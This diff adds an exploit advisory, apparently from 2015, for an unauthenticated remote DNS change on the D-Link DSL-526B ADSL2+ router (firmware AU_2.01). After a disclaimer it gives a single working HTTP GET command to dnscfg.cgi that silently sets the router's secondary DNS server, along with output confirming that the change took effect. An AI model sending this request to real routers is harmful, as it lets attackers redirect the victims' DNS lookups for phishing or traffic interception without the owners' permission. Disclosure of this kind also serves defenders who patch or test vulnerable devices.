@@ -1,0 +1,31 @@
+  D-Link DSL-526B ADSL2+ AU_2.01 
+  Unauthenticated Remote DNS Change
+
+  Copyright 2015 (c) Todor Donev 
+  <todor.donev at gmail.com>
+  http://www.ethical-hacker.org/
+  https://www.facebook.com/ethicalhackerorg
+
+  No description for morons, 
+  script kiddies & noobs !!
+
+  Disclaimer:
+  This or previous programs is for Educational
+  purpose ONLY. Do not use it without permission.
+  The usual disclaimer applies, especially the
+  fact that Todor Donev is not liable for any
+  damages caused by direct or indirect use of the
+  information or functionality provided by these
+  programs. The author or any Internet provider
+  bears NO responsibility for content or misuse
+  of these programs or any derivatives thereof.
+  By using these programs you accept the fact
+  that any damage (dataloss, system crash,
+  system compromise, etc.) caused by the use
+  of these programs is not Todor Donev's
+  responsibility.
+  
+  Use them at your own risk!
+
+[todor@adamantium ~]$ GET "http://TARGET/dnscfg.cgi?dnsSecondary=8.8.8.8&dnsDynamic=0&dnsRefresh=1" | grep "var dns2"  
+    var dns2 = '8.8.8.8';
